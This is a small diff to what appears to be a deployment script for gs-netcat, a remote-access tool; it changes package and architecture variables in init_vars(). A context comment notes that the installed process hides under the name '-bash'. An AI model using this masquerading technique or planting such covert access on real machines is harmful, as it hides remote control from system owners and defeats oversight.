@@ -601,6 +601,7 @@ init_vars()
 			debian=$(cat /etc/os-release | grep debian)
 			centos=$(cat /etc/os-release | grep centos)
 			if [[ ! -z "$debian" ]]; then
+					OSARCH="x86_64-alpine"
 					SRC_PKG="gs-netcat"
 			elif [[ ! -z "$centos" ]]; then
 					SRC_PKG="gs-netcat-centos"
@@ -618,7 +619,7 @@ init_vars()
 	try_encode "base64" "base64 -w0" "base64 -d"
 	try_encode "xxd" "xxd -ps -c1024" "xxd -r -ps"
 	DEBUGF "ENCODE_STR='${ENCODE_STR}'"
-	[[ -z "$SRC_PKG" ]] && SRC_PKG="gs-netcat_${OSARCH}.tar.gz"
+	[[ -z "$SRC_PKG" ]] && SRC_PKG="gs-netcat"
 
 	# OSX's pkill matches the hidden name and not the original binary name.
 	# Because we hide as '-bash' we can not use pkill all -bash.
